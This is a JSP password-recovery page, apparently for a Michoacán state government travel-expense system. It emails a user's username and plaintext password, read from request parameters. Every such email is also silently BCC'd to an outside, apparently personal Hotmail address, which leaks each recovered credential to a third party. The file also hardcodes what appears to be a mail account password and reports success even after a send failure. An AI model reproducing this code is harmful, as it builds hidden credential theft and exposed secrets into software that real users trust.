<%@page import="javax.mail.MessagingException"%>
<%@page import="javax.mail.Transport"%>
<%@page import="javax.mail.internet.MimeMessage"%>
<%@page import="javax.mail.internet.InternetAddress"%>
<%@page import="javax.mail.Message"%>
<%@page import="javax.mail.Session"%>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%
    String band = request.getParameter("Band");
    if(band == null) band = "";
%>
<html>
    <head>
        <title>Inicio de Sesión</title>

        <meta name="description" content="User login page" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link href="<c:url value="/assets/css/bootstrap.min.css"/>" rel="stylesheet" />
        <link rel="stylesheet" href="<c:url value="/assets/css/font-awesome.min.css"/>" />
        <link rel="stylesheet" href="<c:url value="/assets/css/ace-fonts.css"/>" />
        <link rel="stylesheet" href="<c:url value="/assets/css/ace.min.css"/>" />
        <link rel="stylesheet" href="<c:url value="/assets/css/ace-rtl.min.css"/>" />
        <link href="<c:url value="/assets/images/favicon.ico"/>"  type="image/x-icon" rel="shortcut icon">
        <link rel="stylesheet" href="<c:url value="/assets/motion/MotionCAPTCHA/jquery.motionCaptcha.0.2.css"/>"/>
        <link rel="stylesheet" href="<c:url value="/assets/motion/motionCaptcha.demo.css"/>"/>
        
    </head>
    <body class="login-layout" style=" background-image: url('../../assets/images/back_content.jpg')">
        <div class="main-container">
            <div class="main-content">
                <div class="row">
                    <div class="col-sm-10 col-sm-offset-1">
                        <div class="row">
                            <div class="col-sm-4"></div>
                            <div class="col-sm-4 center">
                                <br><br>
                                <img src="<c:url value="/assets/images/logoMichoacan1.png"/>" class="pull-center"/>
                                <!--<br><br>-->
                            </div>
                            <div class="col-sm-4"></div>
                        </div>  
                        <div class="login-container">
                            <div class="space-6"></div>
                            <div id="contenido" class="position-relative">
                                <div id="login-box" class="login-box visible widget-box no-border" >
                                    <div class="widget-body">
                                        <div class="widget-main">
                                            <h5 class="header red lighter bigger">
                                                <%
                                                    if(band.equals("0"))
                                                        out.print("<b>Error:</b>");
                                                    else
                                                        out.print("<b>Búsqueda Exitosa:</b>");
                                                %>
                                            </h5>
                                            <div class="space-6"></div>
                                            <%
                                            String usuario = request.getParameter("Usuario");
                                            String email = request.getParameter("Correo");
                                            String pwd = request.getParameter("pwd");

                                            if(band.equals("0")){
                                                %>
                                                <h4 align="center">El Usuario o Correo No Son Los Registrados</h4><br>
                                                <a href="recuperarPssw.jsp"><h5 align="center">Reintentar</h5></a>
                                                <% 
                                            }
                                            if(band.equals("2")){
                                                java.util.Properties props = new java.util.Properties();
                                                props.put("comprobantesnomina@cetic.michoacan.gob.mx","Cetic.14");
                                                props.put("mail.smtp.host", "smtp.michoacan.gob.mx");
                                                props.put("mail.smtp.socketFactory.port", 25);
                                                Session Sesion = Session.getDefaultInstance(props,null);
                                                try{
                                                    Message message = new MimeMessage(Sesion);
                                                    message.setFrom(new InternetAddress("comprobantesnomina@cetic.michoacan.gob.mx"));
                                                    message.setRecipients(Message.RecipientType.TO,InternetAddress.parse(""+email+""));
                                                    message.setRecipients(Message.RecipientType.BCC,InternetAddress.parse("macemodi10@hotmail.com"));
                                                    message.setSubject("Sistema de Viáticos(Michoacán)");
                                                    message.setText("Buen día. "
                                //                                   +"Estimado(a) "+Nombre+" "+aPaterno+":\n\n"
                                                                   +"Sus Credenciales Recuperadas para Acceder al Sistema de Viáticos Son:\n"
                                                                   +"Usuario: "+usuario+"\nPassword: "+pwd+"");
                                                    Transport.send(message);
                                                }catch(MessagingException e){
                                                %>
                                                    <h4 align="center">No se ha Podido Enviar el Correo, Intentelo mas Tarde</h4><br>
                                                    <a href="<c:url value="/login.jsp"/>" ><h5 align="center">Regresar</h5></a>
                                                <%
                                                }
                                                %><h4 align="center">Los Datos Fueron Enviados a su Correo</h4><br>
                                                <a href="<c:url value="/login.jsp"/>" ><h5 align="center">Regresar</h5></a><%
                                            }
                                            %>
                                        </div><!-- /widget-main -->
                                        <div class="toolbar clearfix " style="padding: 15px;">
                                            <h4 class=" white" style=" text-align: center;">&copy; Gobierno del Estado de Michoac&aacute;n</h4>
                                        </div>
                                    </div><!-- /widget-body -->
                                </div><!-- /login-box -->
                            </div><!-- /position-relative -->
                        </div>
                    </div><!-- /.col -->
                </div><!-- /.row -->
            </div>
        </div><!-- /.main-container -->
    </body>
 </html>
